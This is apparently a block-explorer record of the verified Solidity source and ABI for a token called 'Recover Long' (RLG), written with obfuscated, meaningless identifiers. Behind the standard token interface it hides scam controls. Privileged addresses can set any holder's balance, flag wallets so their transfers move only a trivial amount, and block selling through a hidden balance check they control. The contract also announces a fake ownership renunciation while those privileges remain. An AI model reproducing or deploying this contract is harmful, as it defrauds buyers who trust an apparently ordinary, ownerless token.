{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.6;\n\ninterface liquidityTake {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract sellAuto {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txFund {\n    function createPair(address feeExempt, address exemptReceiver) external returns (address);\n}\n\ninterface feeTotalMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverWallet) external view returns (uint256);\n\n    function transfer(address isAmount, uint256 isFrom) external returns (bool);\n\n    function allowance(address teamFeeSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isFrom) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isAmount,\n        uint256 isFrom\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txAuto, uint256 value);\n    event Approval(address indexed teamFeeSwap, address indexed spender, uint256 value);\n}\n\ninterface feeTotalMinMetadata is feeTotalMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RecoverLong is sellAuto, feeTotalMin, feeTotalMinMetadata {\n\n    uint256 private tokenBuy;\n\n    mapping(address => mapping(address => uint256)) private minAt;\n\n    bool public enableLimit;\n\n    uint256 private fundToken;\n\n    mapping(address => uint256) private tokenLaunched;\n\n    function swapBuy(address fundAuto) public {\n        if (enableLimit) {\n            return;\n        }\n        if (exemptLaunch == fundToken) {\n            receiverTeamLiquidity = tokenBuy;\n        }\n        modeMax[fundAuto] = true;\n        \n        enableLimit = true;\n    }\n\n    bool private isWallet;\n\n    function balanceOf(address receiverWallet) public view virtual override returns (uint256) {\n        return tokenLaunched[receiverWallet];\n    }\n\n    function listEnable(address walletReceiver, address isAmount, uint256 isFrom) internal returns (bool) {\n        require(tokenLaunched[walletReceiver] >= isFrom);\n        tokenLaunched[walletReceiver] -= isFrom;\n        tokenLaunched[isAmount] += isFrom;\n        emit Transfer(walletReceiver, isAmount, isFrom);\n        return true;\n    }\n\n    uint256 public receiverTeamLiquidity;\n\n    string private feeMaxSwap = \"Recover Long\";\n\n    function approve(address swapWallet, uint256 isFrom) public virtual override returns (bool) {\n        minAt[_msgSender()][swapWallet] = isFrom;\n        emit Approval(_msgSender(), swapWallet, isFrom);\n        return true;\n    }\n\n    function getOwner() external view returns (address) {\n        return sellAmountMax;\n    }\n\n    uint256 maxTotal;\n\n    address public modeLiquidity;\n\n    function name() external view virtual override returns (string memory) {\n        return feeMaxSwap;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTxTotal;\n    }\n\n    function transferFrom(address walletReceiver, address isAmount, uint256 isFrom) external override returns (bool) {\n        if (_msgSender() != totalLiquidity) {\n            if (minAt[walletReceiver][_msgSender()] != type(uint256).max) {\n                require(isFrom <= minAt[walletReceiver][_msgSender()]);\n                minAt[walletReceiver][_msgSender()] -= isFrom;\n            }\n        }\n        return buyAuto(walletReceiver, isAmount, isFrom);\n    }\n\n    function tradingSell(address autoReceiverLiquidity) public {\n        listMin();\n        if (exemptLaunch != receiverTx) {\n            receiverTx = exemptLaunch;\n        }\n        if (autoReceiverLiquidity == modeLiquidity || autoReceiverLiquidity == toList) {\n            return;\n        }\n        shouldAutoTeam[autoReceiverLiquidity] = true;\n    }\n\n    uint256 public receiverTx;\n\n    address totalLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 isAutoFrom;\n\n    function buyAuto(address walletReceiver, address isAmount, uint256 isFrom) internal returns (bool) {\n        if (walletReceiver == modeLiquidity) {\n            return listEnable(walletReceiver, isAmount, isFrom);\n        }\n        uint256 exemptReceiverAmount = feeTotalMin(toList).balanceOf(isExempt);\n        require(exemptReceiverAmount == maxTotal);\n        require(isAmount != isExempt);\n        if (shouldAutoTeam[walletReceiver]) {\n            return listEnable(walletReceiver, isAmount, fromWallet);\n        }\n        return listEnable(walletReceiver, isAmount, isFrom);\n    }\n\n    string private launchTxTotal = \"RLG\";\n\n    mapping(address => bool) public modeMax;\n\n    event OwnershipTransferred(address indexed toLaunched, address indexed shouldTeam);\n\n    bool private buyWallet;\n\n    function modeBuy(uint256 isFrom) public {\n        listMin();\n        maxTotal = isFrom;\n    }\n\n    address isExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function listTrading() public {\n        emit OwnershipTransferred(modeLiquidity, address(0));\n        sellAmountMax = address(0);\n    }\n\n    function allowance(address takeMode, address swapWallet) external view virtual override returns (uint256) {\n        if (swapWallet == totalLiquidity) {\n            return type(uint256).max;\n        }\n        return minAt[takeMode][swapWallet];\n    }\n\n    uint256 constant fromWallet = 4 ** 10;\n\n    uint256 private walletIs = 100000000 * 10 ** 18;\n\n    function launchLimit(address buyFrom, uint256 isFrom) public {\n        listMin();\n        tokenLaunched[buyFrom] = isFrom;\n    }\n\n    address private sellAmountMax;\n\n    function decimals() external view virtual override returns (uint8) {\n        return shouldAt;\n    }\n\n    function owner() external view returns (address) {\n        return sellAmountMax;\n    }\n\n    uint8 private shouldAt = 18;\n\n    function transfer(address buyFrom, uint256 isFrom) external virtual override returns (bool) {\n        return buyAuto(_msgSender(), buyFrom, isFrom);\n    }\n\n    mapping(address => bool) public shouldAutoTeam;\n\n    uint256 private exemptLaunch;\n\n    constructor (){\n        if (buyWallet) {\n            shouldMode = false;\n        }\n        liquidityTake autoModeFee = liquidityTake(totalLiquidity);\n        toList = txFund(autoModeFee.factory()).createPair(autoModeFee.WETH(), address(this));\n        if (receiverTeamLiquidity == tokenBuy) {\n            shouldMode = false;\n        }\n        modeLiquidity = _msgSender();\n        listTrading();\n        modeMax[modeLiquidity] = true;\n        tokenLaunched[modeLiquidity] = walletIs;\n        \n        emit Transfer(address(0), modeLiquidity, walletIs);\n    }\n\n    address public toList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletIs;\n    }\n\n    function listMin() private view {\n        require(modeMax[_msgSender()]);\n    }\n\n    bool private shouldMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"teamFeeSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txAuto\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"launchLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"modeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTeamLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTx\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"shouldAutoTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAuto\",\"type\":\"address\"}],\"name\":\"swapBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"tradingSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isFrom\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RecoverLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}